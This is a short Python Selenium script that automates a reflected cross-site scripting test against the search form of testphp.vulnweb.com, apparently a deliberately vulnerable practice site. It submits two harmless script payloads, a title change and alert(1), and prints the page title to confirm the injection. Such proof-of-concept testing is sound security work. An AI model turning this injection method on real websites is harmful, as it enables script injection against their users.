from selenium import webdriver
from time import sleep

url = "http://testphp.vulnweb.com/search.php?test=query"

driver = webdriver.Chrome('/Applications/chromedriver' , options=None)
inputbox = '//*[@id="search"]/form/input[1]'
button = '//*[@id="search"]/form/input[2]'
script1 = "<script>document.title = 'Title changed using Selenium.';</script>"
script2 = "<script>alert(1);</script>"

driver.get(url)
print("Initial title: " + driver.title)
driver.find_element_by_xpath(inputbox).send_keys(script1)
driver.find_element_by_xpath(button).click()
print("Final title: " + driver.title)
sleep(3)

driver.refresh()
driver.find_element_by_xpath(inputbox).send_keys(script2)
driver.find_element_by_xpath(button).click()
sleep(3)

driver.quit()